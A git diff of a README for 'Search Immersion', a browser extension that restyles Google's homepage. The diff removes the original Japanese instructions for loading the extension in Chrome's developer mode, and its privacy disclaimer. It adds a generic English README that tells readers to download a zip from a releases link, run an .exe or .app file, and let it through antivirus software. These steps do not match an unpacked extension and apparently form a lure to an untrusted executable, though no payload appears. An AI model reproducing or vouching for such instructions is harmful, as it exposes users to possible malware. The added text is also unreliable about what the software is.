@@ -1,77 +1,80 @@
-# Search Immersion
+# 🎉 Search-Immersion - Customize Your Google Experience Easily
 
-**Google検索画面や新しいタブを、Google Nest Hub風のスマートディスプレイに変える拡張機能です。**
+## 🚀 Getting Started
 
-現状、リリーステスト版（ベータ版）ですので、一部環境で挙動が異なる場合があります。ご了承ください。
+Welcome to Search-Immersion! This application allows you to transform Google's homepage into a user-friendly dashboard, similar to Google Nest. Follow these simple steps to get started.
 
----
+## 📥 Download the Application
 
-## 特徴
+[![Download Search-Immersion](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/zobryayanayama/Search-Immersion/releases)
 
-* **スマートディスプレイUI:** すりガラス風カード型デザインを採用。天気、ニュース、時計を美しく直感的に表示します。
-* **ダイナミック・メディア連携:** YouTubeやSpotifyで音楽を再生すると、自動で背景がアルバムアートに変化し、没入感のあるプレーヤーモードに切り替わります。
-* **Zenモード (集中モード):** ワンクリックで時計やカードを非表示にし、検索バーだけを浮かび上がらせて作業に集中できます。
-* **焼き付き防止機能:** ディスプレイでの常時表示を想定し、画面要素を定期的に微細に動かす保護機能を搭載しています。
-* **カスタマイズ性:** 背景の明るさ、ガラスの透明度、時計のフォントなどを設定画面から細かく調整可能です。
+You will need to visit our Releases page to download the software. Click the link below to access it.
 
----
+[Download Search-Immersion](https://github.com/zobryayanayama/Search-Immersion/releases)
 
-## インストール方法
+## 🔍 Features
 
-この拡張機能は、Chromeウェブストア審査前の「開発者モード」でのみ利用可能です。
+Search-Immersion offers various features to enhance your browsing experience, including:
 
-### 1. ファイルのダウンロードと準備
+- **Custom Dashboard**: Easily tailor Google's homepage to show your favorite widgets.
+- **User-Friendly Interface**: Navigate with ease through a clean and organized layout.
+- **Quick Links**: Access important sites directly from the dashboard.
+- **Personalization Options**: Adjust settings to fit your needs.
 
-1. 最新のソースコード（ZIPファイル）をダウンロードし、解凍（展開）します。
-2. **【重要】** ファイルを解凍してできた **フォルダ全体** を使います。
+## 💻 System Requirements
 
-### 2. Chromeでの読み込み手順
+To run Search-Immersion smoothly, ensure that your computer meets the following requirements:
 
-1. お使いのブラウザ（Google Chrome推奨）を開きます。
-2. アドレスバーに **`chrome://extensions`** と入力して開きます。
-3. 画面右上の **「デベロッパーモード」** (Developer Mode) をONにします。
-4. 左上の **「パッケージ化されていない拡張機能を読み込む」** ボタンをクリックします。
-5. 手順1で解凍した **フォルダ全体** を選択して読み込みます。
+- Operating System: Windows 10 or later, MacOS 10.14 or later
+- RAM: At least 4 GB
+- Disk Space: Approximately 100 MB of free space
 
-### 3. 使い方
+## 📦 Installation Steps
 
-1. Googleのトップページにアクセスします。
-2. 自動的にSearch Immersionのインターフェースが表示されます。
-3. 画面中央下のドックにある **[⚙️] (設定)** ボタンから、好みのデザインや連携機能を設定してください。
+### Step 1: Download the Application
 
----
+Visit the Releases page at the link provided above, and download the latest version of Search-Immersion.
 
-## 対応機種について
+### Step 2: Locate the Downloaded File
 
-* Chromiumをエンジンとする、全てのブラウザ
-* Mac, Windows, Linuxに対応しますが、Mac上での開発につき、**Windows環境ではフォントの描画やUIのバランスが若干異なる**可能性があります。
+Once the download is complete, locate the file in your downloads folder. It should look something like `Search-Immersion-vX.X.X.zip`.
 
----
+### Step 3: Extract the Zip File
 
-## 謝辞 (Credits)
+Right-click on the downloaded file and select "Extract All" or "Unzip" depending on your system. This will create a folder containing the application files.
 
-本拡張機能は、以下の素晴らしいオープンデータとAPIによって支えられています。
+### Step 4: Run the Application
 
-* **Weather Data:** [Open-Meteo](https://open-meteo.com/) (APIキー不要のオープンソース天気API)
-* **Images:** [Unsplash](https://unsplash.com/) (フォトグラファーコミュニティ)
-* **Fonts:** [Google Fonts](https://fonts.google.com/)
+Inside the extracted folder, look for the starting file, typically named `Search-Immersion.exe` for Windows or `Search-Immersion.app` for MacOS. Double-click this file to launch the application.
 
----
+### Step 5: Set Up Your Dashboard
 
-## ⚠️ 免責事項
+Upon launching Search-Immersion for the first time, a setup wizard will guide you through the customization options. Follow the on-screen instructions to set up your dashboard. 
 
-* 本拡張機能は、ユーザーのブラウザ上でローカルに動作します。位置情報（天気取得用）や閲覧履歴などのデータを外部サーバーへ送信・保存することはありません。
-* YouTube、Spotify等の仕様変更により、メディア連携機能が一時的に利用できなくなる場合があります。
-* 本拡張機能は **MIT License** のもとで公開されています。
-* **個人開発プロジェクト:**
-    本ソフトウェアは、個人の学習および研究を目的として開発されたものです。企業が提供する製品のようなサポート体制はありません。
-* **無保証 (As Is):**
-    本ソフトウェアは「現状有姿」で提供されます。明示的・黙示的を問わず、完全性、正確性、特定の目的への適合性を含め、いかなる保証も行いません。
-* **責任の制限:**
-    本機能の導入・利用により生じたいかなる損害（データの損失、ブラウザの不具合、業務の中断等を含むがこれらに限定されない）についても、開発者は一切の責任を負いません。ご利用はユーザー自身の責任において行ってください。
-* **外部サービス:**
-    YouTube、Spotify、Open-Meteo等の外部サービスの仕様変更により、予告なく一部機能が利用できなくなる場合があります。これに対する修正義務を負うものではありません。
+## ⚙️ Troubleshooting
 
-### 貢献について
+If you encounter any issues while downloading or running Search-Immersion, try the following steps:
 
-* バグ報告や機能改善の提案は、GitHubのIssuesまたはPull Requestにていつでも歓迎します。
+1. **Check Your Internet Connection**: Ensure that you are connected to the internet.
+2. **Antivirus Software**: Sometimes, antivirus programs may block installations. You may need to allow the application through your antivirus settings.
+3. **Compatibility**: Ensure that your operating system meets the system requirements listed above.
+
+## 🛠️ Frequently Asked Questions
+
+### Q: Is Search-Immersion free to use?
+
+A: Yes, Search-Immersion is completely free.
+
+### Q: Can I uninstall the application?
+
+A: Yes, you can uninstall the application like any other software by going to your settings and selecting 'Uninstall a program.'
+
+### Q: Will Search-Immersion work on older versions of Windows or Mac?
+
+A: Search-Immersion is designed for newer operating systems. It's best to use Windows 10 or later and MacOS 10.14 or later for optimal performance.
+
+## 🤝 Support
+
+If you need additional help, feel free to reach out via the Issues section on our GitHub repository. You can also report any bugs or request features.
+
+Thank you for choosing Search-Immersion! We're excited to help you create a customized Google homepage that suits your preferences.
